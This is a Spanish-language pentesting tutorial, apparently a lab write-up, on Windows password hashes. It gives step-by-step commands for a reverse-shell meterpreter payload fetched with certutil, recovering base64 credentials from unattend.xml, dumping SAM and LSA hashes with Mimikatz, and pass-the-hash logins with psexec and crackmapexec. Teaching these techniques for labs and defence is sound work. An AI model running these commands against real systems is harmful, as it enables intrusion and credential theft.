<h1 align="center">Windows Password Hashes</h1>

El “hashing” es el proceso de convertir un trozo de información en otro valor, con la intencion de cifrar el contenido gracias al algoritmo de cifrado. Los hashes de las cuentas de usuario de Windows de almacenan en el SAM (Security Acounts Manager).

La autenticación y verificación de las credenciales las realizar el LSA (Local Security Authority).

A partir de Windows Server 2003 existen dos tipos de hashes: LM y NTLM. A partir de Windows vista, solamente exite NTLM

## **SAM DATABASE**

Security Acounts Manager (SAM) es una base de datos donde se encuentran hasheadas las cuentas de usuarios y contraseñas de Windows. Esta base de datos no se puede copiar mientras está corriendo el SO.

Por eso, los atacantes utilizan herramientas para conseguir los hashes. En versiones modernas de windows se necesita una key para desencriptar la base de datos SAM

## **LM (LanMan)**

Es un formato de cifrado que se utilizaba antes (antes de NT 4.0) para cifrar las contraseñas de usuarios pero es debil y facil de desencriptar con fuerza bruta

## **NTLM (NTHash)**

Es un formato de cifrado que se utiliza para facilitar la comunicacion entre equipos. Cuando se crea una cuenta de usuario, se encripta usando el algoritmo de hashing MD4, mientras que la contraseña original se descarta. Es un cifrado mas potente que LM pero pueden ser descifradas con fuerza bruta

Buscando Contraseñas En Archivos De Configuración de Windows

Cuando queremos instalar Windows en mas de dos equipos, para no hacerlo de forma manual, podemos utilizar el “Unattended setup utility” (usualmente llamado unattend.xml), que es un archivo que contiene todas las respuestas necesarias para la instalacion de Windows como: fecha, hora, credenciales del usuario administrador…

Si los archivos de configuracion que gerera “Unattended setup utility” se dejan después de la instalación en el sistema, puede revelar credenciales de usuario. Por eso, tenemos que eliminar todos estos archivos.

Dependiendo de la version de Windows pueden estar cifrados en base64 y pueden guardarse en:

- `C:\Windows\Panther\Unattend.xml`
- `C:\Windows\Panther\Autounattend.xml`

## Puesta en practica:

En esta practica tenemos acceso a una shell de la máquina windows, para conseguir una sesion de meterpreter tenemos que crear el payload con msfvenom, al ser de 64bits utilizaremos el siguiente:

- `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=*ip* LPORT=*1234* -f exe > payload.exe`

Para pasar este payload a la máquina windows nos abrimos un servidor web con python:

- `python3 -m http.server`

Y lo descargamos desde windows con la herramienta certutil con el siguiente comando:

- `certutil -urlcache -f http://*ip_kali*/payload.exe payload.exe`

Una vez descargado nos ponemos a la escucha con multi/handler en metasploit y incluimos el payload de msfvenom:

- `use windows/x64/meterpreter/reverse_tcp`

Cuando conseguimos la conexión de meterpreter podemos buscar el archivo unattend.xml en la siguiente ruta

- `cd C:\`
- `cd Windows\Panther`

Una vez localizado lo descargamos:

- `download unattend.xml`

Cuando lo tenemos descargado podemos leerlo por si contiene alguna contraseña filtrada:

![image](https://github.com/user-attachments/assets/4193889f-46e5-49e2-bd33-c3fab7928154)

Como podemos comprobar esta encriptada en base64, la copiamos, creamos un archivo pegando ese contenido y lo desencriptamos con el siguiente comando:

- `base64 -d contra.txt`

![image](https://github.com/user-attachments/assets/57de5e89-7407-45cf-a552-1a72f71b0509)

En algunos casos podemos encontrarnos que el usuario administrador a cambiado la contraseña tras la instalacion. Para comprobar si tenemos acceso a la maquina victima con estas credenciales vamos a pobar la conexion con la herramienta PSEXEC.py:

- `psexec.py administrator@*ip_victima*`

![image](https://github.com/user-attachments/assets/adde57ca-1536-477d-8d18-18ae207e7dee)

## **MIMIKATZ**

Mimikatz es un herramienta que se utiliza para la extraccion de contraseñas en texto plano, hashes y tickets de kerberos de la memoria. Se puede utilizar para extraer hashes del proceso de memoria lsass.exe donde se almacenan los hashes, ya que este proceso interactúa los las bases de datos SAM.

Su uso requiere privilegios elevados. Se puede ejecutar de dos formas:

- Viene por defecto instalado con kali
- A través de una sesión de meterpreter con el comando Kiwi

\- Uso con meterpreter:

Tras conseguir una sesion de meterpreter tras vulnerar una maquina hemos accedido con el usuario administrador. Pero primero queremos escalar al usuario NT System ya que es el usuario con mas privilegios en Windows, para ello tenemos que migrar al proceso lsass:

![image](https://github.com/user-attachments/assets/5f397600-3c06-4979-ab3a-c7f6a8541ef5)

Ahora que somos el usuario system, cargamos kiwi en meterpreter y escribimos “?” para ver los comandos:

- `load kiwi`
- `?`

![image](https://github.com/user-attachments/assets/69bf9cdd-c650-4cc3-8f04-ec4f6d25ee73)

Para mostrar los hashes de las credenciales podemos usar el comando “creds_all”, lo que nos mostrara el hash ntlm del usuario administrador

![image](https://github.com/user-attachments/assets/01723edf-f542-4e98-ba73-c9138677bf61)

Para conseguir todos los hashes ntlm de todos los usuarios del sistema:

- `lsa_dump_sam`

![image](https://github.com/user-attachments/assets/176c7c53-3db4-4878-a2d6-cf012080b06e)

\- Uso con el ejecutable de mimikatz:

Primero tenemos que crear la carpeta temp en C: para almacenar el exploit y lo subimos utilizando “upload” en meterpreter o descargandolo de nuestro kali tras abrirnos un servidor http con python3. Despues lo ejecutamos con ./ y se nos habre una terminal de Mimikatz

Para saber si disponemos de las credenciales para extraer los hashes de la memoria podemos comprobarlo con:

- `privilege::debug`

![image](https://github.com/user-attachments/assets/9b7cd988-0097-4770-be31-c85a5dd3f13e)

Para mostrar los hashes de las credenciales escribimos:

- `lsadump::sam`

Para mostrar las credenciales en texto plano (Si esta bien configurado no deberia mostrarlas):

- `lsadump::secrets`

## **PASS-THE-HASH ATTACKS**

Una vez hemos conseguido los hashes de las credenciales de los usuarios con herramientas como Mimikatz, podemos realizar un ataque “pass-the-hash”. Es una técnica que se utiliza para capturar el hash ntlm y utilizarlo para autenticarse de forma legítima via SMB.

Herramientas que se utilizan para realizar el ataque “Pass-The-Hass”:

- psexec en metasploit
- crackmapexec

Lo primero, necesitamos los hashes, con Mimikatz podemos usar el comando para obtener los hashes ntlm de los usuarios:

- `lsa_dump_sam`

![image](https://github.com/user-attachments/assets/6af39d6b-8780-4898-b96e-f9458a7ffaae)

## **psexec en metasploit**

Para el modulo de metasploit “psexec”, además de los hashes ntlm, necesitamos los hashes “lm”. El hash lm son los primeros digitos entre los dos puntos y el hash ntlm es el hash completo que esta señalizado en la captura. Para conseguirlo utilizamos el comando:

- `hashdump`

![image](https://github.com/user-attachments/assets/e75ccdaf-1c08-4f03-90f4-bd5a3cf4297c)

Ahora que tenemos el hash lm que incluye el ntlm, buscamos el modulo de “psexec” en metasploit y establecemos la sesion de meterpreter con la victima con los siguientes campos:

- `sesion`
- `Lport`
- `rhost`
- `set smbuser administrator`
- `set smbpass *hash_lm*`
- `set target Native\ upload (Para utilizar la sesion de meterpreter)`
- `run`

**crackmapexec**

Para crackmapexec nos bastara con el hash ntlm, que el conjunto de digitos que hay en el segundo bloque de los dos puntos y para realizar la conexion utilizaremos el siguiente comando:

- `crackmapexec smb *ip* -u Administrador -H *hash_ntlm*`

![image](https://github.com/user-attachments/assets/a3fc6e5f-ec63-45b7-b94f-0bfda01bad95)

Ahora que sabemos que podemos acceder al sistema utilizaramos el parametro -x para enviar comandos. Da errores pero aparece la informacion.

- `crackmapexec smb *ip* -u Administrador -H *hash_ntlm* -x “ipconfig”`
